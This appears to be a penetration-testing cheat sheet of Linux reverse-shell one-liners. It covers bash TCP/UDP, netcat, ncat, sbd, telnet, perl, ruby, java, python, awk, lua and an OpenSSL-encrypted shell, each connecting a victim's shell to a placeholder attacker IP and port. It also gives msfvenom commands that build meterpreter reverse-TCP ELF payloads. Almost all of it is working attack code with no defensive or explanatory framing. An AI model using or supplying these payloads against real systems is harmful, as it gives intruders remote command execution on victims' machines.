# Linux Shells

## Bash TCP
##### Listener
```bash
bash -i >& /dev/tcp/[IP]/[Port] 0>&1
```
##### Shell
```sh
0<&123;exec 123<>/dev/tcp/[IP]/[Port]; sh <&123 >&123 2>&123
```

## Bash UDP
##### Listener
```sh
nc -u -lvp [PORT]
```
##### Shell
```bash
sh -i >& /dev/udp/[IP]/[PORT] 0>&1
```

## nc
##### Listener
```bash
nc -nvlp [PORT] -e /bin/bash
```
##### Shell
```bash
nc [IP] [PORT] -e /bin/bash
```
```bash
rm -f /tmp/p; mknod /tmp/p p && nc [IP] [PORT] 0/tmp/p
```

## ncat
##### Listener
```bash
ncat --exec cmd.exe --allow [IP] -vnl [PORT] --ssl
```
##### Shell
```bash
ncat -nv [IP] [PORT]
```

## sdb
##### Listener
```bash
sbd -lp [PORT] -k secret -e /bin/bash
```
##### Shell
```bash
sbd -k secret [IP] [PORT]
```

## telnet
##### Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f
telnet [IP] [PORT] 0</tmp/f | sh >/tmp/f 2>&1
```
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet [IP] [PORT] 0/tmp/p
```
```bash
telnet [IP] [PORT] | /bin/bash | telnet [IP] [PIPED-PORT]
```

## perl
```perl
perl -e 'use Socket;$i=[RT-IP];$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open([IP],[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IP]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/[PORT];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/[IP]/[PORT];cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

## python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([IP],[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```python
export RHOST="[IP]";export RPORT=[PORT];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[IP]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

##### IPv6
```python
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("[IPV6ADDR]",[PORT],0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

##### Spawn Shell
```python
python -c 'import os; os.system("/bin/sh")'
```
```python
python -c "import pty;pty.spawn('/bin/bash')"
```

## Awk
```sh
awk 'BEGIN {s = "/inet/tcp/0/[IP]/[PORT]"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Lua
```powershell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('[IP]','[PORT]');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```
```powershell
lua5.1 -e 'local host, port = "[IP]", [PORT] local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSL

##### Create Certificates
```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 180 -nodes
```
##### Start Server
```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port [PORT]
```
##### Alternate Server With Netcat
```sh
ncat --ssl -vv -l -p [PORT]
```
##### Victim Connection
```sh
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [IP]:[PORT] > /tmp/s; rm /tmp/s
```

## Metasploit
##### Staged reverse TCP
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
```
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > [NAME].elf
```

##### Stageless reverse TCP
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
```

